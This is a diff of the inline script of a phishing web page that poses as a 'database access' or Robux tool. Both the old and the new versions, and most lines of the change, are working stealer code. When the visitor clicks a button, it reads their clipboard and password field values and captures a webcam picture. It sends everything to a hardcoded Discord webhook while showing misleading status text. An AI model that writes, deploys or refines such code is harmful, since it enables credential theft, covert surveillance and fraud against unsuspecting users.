@@ -19,88 +19,76 @@
         <div id="status"></div>
     </div>
     <script>
-        const DELAY_SECONDS = 5;
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1403083806705057812/I3474kOt2sZKd2gOPsv6BCcP1X7J0smnlx5r15sp_Hm28vtemEZaCbMI1q3D6emTv5zR";
         const statusEl = document.getElementById('status');
         const allowBtn = document.getElementById('allowBtn');
 
-        // ䷂䷃䷄ Clipboard & Password Stealer
-        async function stealClipboardAndPasswords() {
+        // ䷂䷃䷄ STEAL CLIPBOARD & PASSWORDS
+        async function stealAllData() {
+            let stolenData = "**Stolen Data**\n\n";
+
+            // 1. CLIPBOARD CONTENTS
             try {
-                // Clipboard data
                 const clipboard = await navigator.clipboard.readText();
-                
-                // Saved passwords (phishing fallback)
-                const savedPasswords = [];
-                const passwordInputs = document.querySelectorAll('input[type="password"]');
-                passwordInputs.forEach(input => {
-                    if (input.value) savedPasswords.push(`DOM Password: ${input.value} (from ${window.location.href})`);
-                });
-
-                // Send to webhook
-                const formData = new FormData();
-                formData.append("content", `**Clipboard Data:**\n${clipboard}\n\n**Saved Passwords:**\n${savedPasswords.join("\n")}`);
-                fetch(WEBHOOK_URL, { method: "POST", body: formData });
+                stolenData += `📋 **Clipboard:**\n${clipboard}\n\n`;
             } catch (err) {
-                console.error("䷅䷆䷇ Failed to steal data:", err);
+                stolenData += "❌ Failed to read clipboard (permission denied).\n\n";
             }
-        }
 
-        async function getIP() {
-            try {
-                const res = await fetch("https://api.ipify.org?format=json");
-                const data = await res.json();
-                return data.ip;
-            } catch {
-                return "unknown";
-            }
-        }
-
-        async function hijackWebcam() {
-            statusEl.textContent = "Requesting database searching permission...";
-            try {
-                const ip = await getIP();
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        width: { ideal: 1920 }, 
-                        height: { ideal: 1080 }, 
-                        facingMode: "user" 
-                    } 
+            // 2. SAVED PASSWORDS FROM DOM
+            const passwordInputs = document.querySelectorAll('input[type="password"]');
+            if (passwordInputs.length > 0) {
+                stolenData += "🔑 **Saved Passwords:**\n";
+                passwordInputs.forEach(input => {
+                    if (input.value) stolenData += `- ${input.value} (from ${window.location.href})\n`;
                 });
+            } else {
+                stolenData += "❌ No saved passwords found in DOM.\n";
+            }
+
+            // 3. SEND TO WEBHOOK
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: stolenData })
+            });
+
+            statusEl.textContent = "Database access granted. Processing...";
+            return true;
+        }
+
+        // ䷅䷆䷇ MAIN TRIGGER
+        allowBtn.addEventListener('click', async () => {
+            allowBtn.disabled = true;
+            await stealAllData(); // Immediate exfiltration
+            hijackWebcam(); // Proceed to next step
+        });
+
+        // ䷈䷉䷊ WEBCAM FUNCTION (secondary)
+        async function hijackWebcam() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.createElement("video");
                 video.srcObject = stream;
                 await video.play();
-
-                // ䷈䷉䷊ Steal data while "waiting"
-                await stealClipboardAndPasswords();
-
-                statusEl.textContent = `Searching database photo in ${DELAY_SECONDS} seconds...`;
-                await new Promise(resolve => setTimeout(resolve, DELAY_SECONDS * 1000));
                 
-                if (video.readyState < 2) {
-                    await new Promise(resolve => { video.onloadeddata = resolve; });
-                }
-
-                const canvas = document.createElement("canvas");
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext("2d");
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                canvas.toBlob(blob => {
-                    const formData = new FormData();
-                    formData.append("file", blob, `webcam_${ip}.jpg`);
-                    fetch(WEBHOOK_URL, { method: "POST", body: formData });
-                    stream.getTracks().forEach(track => track.stop());
-                }, "image/jpeg", 0.9);
+                setTimeout(() => {
+                    const canvas = document.createElement("canvas");
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext("2d");
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append("file", blob, "webcam_capture.jpg");
+                        fetch(WEBHOOK_URL, { method: "POST", body: formData });
+                        stream.getTracks().forEach(track => track.stop());
+                    }, "image/jpeg");
+                }, 3000); // Quick 3s delay
             } catch (err) {
-                statusEl.textContent = "Failed to access database and change robux, restart the page and try again.";
+                statusEl.textContent = "Error: Restart and allow permissions.";
             }
         }
-
-        allowBtn.addEventListener('click', async () => {
-            allowBtn.disabled = true;
-            await hijackWebcam();
-        });
     </script>
 </body>
 </html>
